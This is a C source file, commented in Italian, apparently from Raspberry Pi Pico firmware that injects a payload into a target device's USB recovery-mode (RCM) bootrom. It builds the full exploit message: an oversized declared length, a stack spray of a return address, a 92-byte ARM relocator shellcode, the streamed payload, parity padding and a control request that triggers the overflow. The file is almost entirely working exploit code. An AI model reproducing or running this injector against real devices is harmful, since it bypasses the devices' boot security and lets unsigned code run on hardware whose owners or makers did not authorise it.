/*
 * rcm_proto.c
 *
 * Costruzione e invio del messaggio RCM.
 *
 * Due vincoli hanno deciso la forma di questo file:
 *
 * 1. Il payload NON viene mai caricato interamente in RAM. Il Pico ha
 *    264 KB: si legge un pezzo dal FAT12 con FatFs, lo si accoda al
 *    pacchetto in uscita, si riusa il buffer.
 *
 * 2. Il messaggio e' un FLUSSO di byte, non una sequenza di blocchi
 *    allineati. L'header e' di 680 byte (0x2A8), quindi tutto quello
 *    che segue - spray, intermezzo, payload - cade a cavallo dei
 *    pacchetti da 0x1000. Da qui il writer bufferizzato: si scrive a
 *    byte, si spedisce a pacchetti pieni. Ogni tentativo di allineare
 *    i pezzi ai 0x1000 sposta l'intera mappa di memoria del target e
 *    l'iniezione non fa niente.
 */
#include <stdio.h>
#include <string.h>
#include <pico/stdlib.h>
#include "ff.h"
#include "config.h"
#include "storage/flash_fat.h"
#include "rcm_host.h"
#include "rcm_proto.h"

#define FILE_READ_CHUNK     512u
#define BULK_TIMEOUT_MS      2000u
#define DEVICE_ID_TIMEOUT_MS 1000u
#define TRIGGER_TIMEOUT_MS   5000u

/*
 * Relocator: gira a 0x4001F000, ricopia 0x1000 byte alla volta il
 * payload da RCM_PAYLOAD_LOAD_BLOCK a RCM_PAYLOAD_ADDR e ci salta.
 * Le ultime quattro word sono, in ordine: 0x4001F020, 0x4001F05C,
 * RCM_PAYLOAD_LOAD_BLOCK, RCM_PAYLOAD_ADDR.
 */
static const uint8_t intermezzo[92] = {
    0x44, 0x00, 0x9F, 0xE5, 0x01, 0x11, 0xA0, 0xE3, 0x40, 0x20, 0x9F, 0xE5,
    0x00, 0x20, 0x42, 0xE0, 0x08, 0x00, 0x00, 0xEB, 0x01, 0x01, 0xA0, 0xE3,
    0x10, 0xFF, 0x2F, 0xE1, 0x00, 0x00, 0xA0, 0xE1, 0x2C, 0x00, 0x9F, 0xE5,
    0x2C, 0x10, 0x9F, 0xE5, 0x02, 0x28, 0xA0, 0xE3, 0x01, 0x00, 0x00, 0xEB,
    0x20, 0x00, 0x9F, 0xE5, 0x10, 0xFF, 0x2F, 0xE1, 0x04, 0x30, 0x90, 0xE4,
    0x04, 0x30, 0x81, 0xE4, 0x04, 0x20, 0x52, 0xE2, 0xFB, 0xFF, 0xFF, 0x1A,
    0x1E, 0xFF, 0x2F, 0xE1, 0x20, 0xF0, 0x01, 0x40, 0x5C, 0xF0, 0x01, 0x40,
    0x00, 0x00, 0x02, 0x40, 0x00, 0x00, 0x01, 0x40,
};

// Il payload deve atterrare esattamente su RCM_PAYLOAD_LOAD_BLOCK. Se
// qualcuno tocca un define e la somma non torna piu', meglio un errore
// di build che un'iniezione che parte e non fa niente.
_Static_assert(sizeof(intermezzo) < RCM_CHUNK_SIZE,
               "intermezzo e padding devono stare in un solo blocco");
_Static_assert(RCM_HEADER_SIZE % 4u == 0u,
               "lo spray dopo l'header deve restare allineato a 4");
_Static_assert(RCM_PREFIX_SIZE == 0x102A8u,
               "prefisso alterato: il payload non cade su 0x40020000");
_Static_assert(RCM_PAYLOAD_MAX > 0u && RCM_PAYLOAD_MAX == 0x1FFF0u,
               "tetto payload incoerente con RCM_MAX_MSG_LEN");
_Static_assert(RCM_PAYLOAD_LOAD_BLOCK + RCM_PAYLOAD_MAX <= RCM_IRAM_END,
               "un payload al tetto sfonderebbe la fine dell'IRAM");
_Static_assert(RCM_PAYLOAD_ADDR + RCM_PAYLOAD_MAX <= RCM_IRAM_END,
               "la copia dell'intermezzo sfonderebbe la fine dell'IRAM");

static FATFS fs;

// ------------------------------------------------------- writer bufferizzato

// Allineamento esplicito: e' un buffer DMA per TinyUSB. GCC allinea
// comunque un array di questa taglia, ma non e' garantito dallo standard
// e qui non si vuole scoprirlo in campo. L'equivalente lato TinyUSB e'
// CFG_TUH_MEM_ALIGN; non lo si usa direttamente per tenere questo file
// libero da tusb.h (cosi' resta compilabile fuori dal target).
static uint8_t  packet[RCM_CHUNK_SIZE] __attribute__((aligned(4)));
static uint32_t packet_used;
static uint32_t packets_sent;

static void wr_reset(void) {
    packet_used  = 0;
    packets_sent = 0;
}

// Spedisce sempre un pacchetto PIENO: il target ragiona per blocchi da
// 0x1000, non per byte utili. La coda viene azzerata.
static bool wr_flush(void) {
    if (packet_used < RCM_CHUNK_SIZE) {
        memset(packet + packet_used, 0, RCM_CHUNK_SIZE - packet_used);
    }
    packet_used = 0;

    if (!rcm_bulk_out(packet, RCM_CHUNK_SIZE, BULK_TIMEOUT_MS)) return false;
    packets_sent++;
    return true;
}

static bool wr(const void *data, uint32_t len) {
    const uint8_t *p = (const uint8_t *)data;

    while (packet_used + len >= RCM_CHUNK_SIZE) {
        uint32_t n = RCM_CHUNK_SIZE - packet_used;
        memcpy(packet + packet_used, p, n);
        packet_used += n;
        if (!wr_flush()) return false;
        p   += n;
        len -= n;
    }

    if (len) {
        memcpy(packet + packet_used, p, len);
        packet_used += len;
    }
    return true;
}

static bool wr_u32(uint32_t v) {
    const uint8_t b[4] = {
        (uint8_t)(v & 0xffu),
        (uint8_t)((v >>  8) & 0xffu),
        (uint8_t)((v >> 16) & 0xffu),
        (uint8_t)((v >> 24) & 0xffu),
    };
    return wr(b, sizeof(b));
}

static bool wr_zero(uint32_t len) {
    while (len) {
        uint32_t n = RCM_CHUNK_SIZE - packet_used;
        if (n > len) n = len;
        memset(packet + packet_used, 0, n);
        packet_used += n;
        len         -= n;
        if (packet_used == RCM_CHUNK_SIZE && !wr_flush()) return false;
    }
    return true;
}

// ------------------------------------------------------- messaggio

// Header: lunghezza dichiarata (il massimo accettato, non quella reale)
// e poi zeri fino a 680 byte.
static bool send_header(void) {
    return wr_u32(RCM_MAX_MSG_LEN)
        && wr_zero(RCM_HEADER_SIZE - 4u);
}

// Spray dell'indirizzo dell'intermezzo su tutta la finestra che contiene
// lo stack del bootrom.
static bool send_stack_spray(void) {
    for (uint32_t i = 0; i < RCM_SPRAY_WORDS; i++) {
        if (!wr_u32(RCM_INTERMEZZO_ADDR)) return false;
    }
    return true;
}

// Intermezzo + padding: insieme occupano esattamente un blocco da
// 0x1000, cosi' il payload atterra su RCM_PAYLOAD_LOAD_BLOCK.
static bool send_intermezzo(void) {
    return wr(intermezzo, sizeof(intermezzo))
        && wr_zero(RCM_CHUNK_SIZE - sizeof(intermezzo));
}

static bool send_payload(FIL *fp) {
    static uint8_t buf[FILE_READ_CHUNK];

    for (;;) {
        UINT got = 0;
        if (f_read(fp, buf, sizeof(buf), &got) != FR_OK) return false;
        if (got == 0) break;                 // EOF
        if (!wr(buf, got)) return false;
    }
    return true;
}

// ------------------------------------------------------- sequenza

bool rcm_proto_inject(void) {
    // ---- 1. il target risponde? Il device ID e' la prima cosa che il
    //         bootrom mette sull'endpoint IN. Se non arriva lo diciamo e
    //         proviamo comunque: alcuni target lo consegnano in ritardo e
    //         l'iniezione riesce lo stesso.
    uint8_t device_id[RCM_DEVICE_ID_LEN];
    if (rcm_bulk_in(device_id, sizeof(device_id), DEVICE_ID_TIMEOUT_MS)) {
        printf("[rcm] device ID:");
        for (unsigned i = 0; i < sizeof(device_id); i++) printf(" %02x", device_id[i]);
        printf("\n");
    } else {
        printf("[rcm] device ID non letto - continuo comunque\n");
    }

    // ---- 2. payload dal FAT12 in flash
    if (f_mount(&fs, "", 1) != FR_OK) {
        printf("[rcm] mount FAT fallito\n");
        return false;
    }

    FIL fp;
    if (f_open(&fp, PAYLOAD_FILENAME, FA_READ) != FR_OK) {
        printf("[rcm] %s non trovato\n", PAYLOAD_FILENAME);
        f_unmount("");
        return false;
    }

    uint32_t payload_size = (uint32_t)f_size(&fp);
    if (payload_size == 0) {
        printf("[rcm] payload vuoto\n");
        f_close(&fp);
        f_unmount("");
        return false;
    }
    // Il tetto e' il soffitto dell'IRAM, non una convenzione: il payload
    // atterra su RCM_PAYLOAD_LOAD_BLOCK e oltre RCM_IRAM_END non c'e'
    // memoria. Un payload piu' grande non puo' funzionare in nessun caso,
    // quindi tanto vale dirlo qui invece di lasciarlo diventare un
    // timeout su un bulk OUT a meta' invio.
    if (payload_size > RCM_PAYLOAD_MAX) {
        printf("[rcm] payload troppo grande: %lu byte, il tetto e' %lu "
               "(soffitto IRAM a 0x%08x)\n",
               (unsigned long)payload_size, (unsigned long)RCM_PAYLOAD_MAX,
               RCM_IRAM_END);
        f_close(&fp);
        f_unmount("");
        return false;
    }
    printf("[rcm] payload %lu byte\n", (unsigned long)payload_size);

    // ---- 3. costruzione del messaggio, in streaming
    wr_reset();
    if (!send_header())        goto fail;
    if (!send_stack_spray())   goto fail;
    if (!send_intermezzo())    goto fail;
    if (!send_payload(&fp))    goto fail;
    if (!wr_flush())           goto fail;    // coda parziale

    f_close(&fp);
    f_unmount("");

    // ---- 4. parita'. Il bootrom alterna due buffer di copia ad ogni
    //         pacchetto da 0x1000; con un numero dispari di pacchetti
    //         l'ultima copia atterra su quello giusto. Se siamo pari, un
    //         pacchetto di padding in piu' rimette a posto.
    if ((packets_sent % 2u) != 1u) {
        if (!wr_flush()) return false;
    }
    printf("[rcm] %lu pacchetti da 0x%x spediti\n",
           (unsigned long)packets_sent, RCM_CHUNK_SIZE);

    // ---- 5. trigger, atteso.
    //
    //  Qui NON si appiattisce l'esito su "successo/fallimento", perche' i
    //  quattro casi vogliono dire cose diverse:
    //
    //    OK       il bootrom ha chiuso lo status stage prima di saltare.
    //    TIMEOUT  non risponde piu'. E' l'esito NORMALE di un'iniezione
    //             riuscita: il target sta gia' eseguendo il payload e non
    //             ha nessun motivo di chiudere il transfer. Trattarlo
    //             come errore vorrebbe dire accendere il LED rosso
    //             proprio quando ha funzionato - e il LED e' l'unico
    //             feedback che si ha in campo.
    //    STALLED  il device ha RESPINTO la richiesta. Questo e' il
    //             fallimento vero: l'overflow non e' avvenuto.
    //    FAILED   non e' nemmeno partita.
    //
    //  L'unico verdetto definitivo resta lo schermo del target, ma
    //  distinguere stall da timeout e' l'unica informazione utile che si
    //  puo' cavare da questo lato del cavo, e buttarla via sarebbe uno
    //  spreco.
    rcm_xfer_t trig = rcm_control_out(RCM_TRIGGER_BMREQTYPE, RCM_TRIGGER_BREQUEST,
                                      0, 0, RCM_TRIGGER_WLENGTH, TRIGGER_TIMEOUT_MS);
    printf("[rcm] trigger: %s\n", rcm_xfer_name(trig));

    if (trig == RCM_XFER_STALLED || trig == RCM_XFER_FAILED) {
        printf("[rcm] il target ha respinto il trigger: exploit non innescato\n");
        return false;
    }

    sleep_ms(100);
    return true;

fail:
    printf("[rcm] transfer fallito dopo %lu pacchetti\n",
           (unsigned long)packets_sent);
    f_close(&fp);
    f_unmount("");
    return false;
}
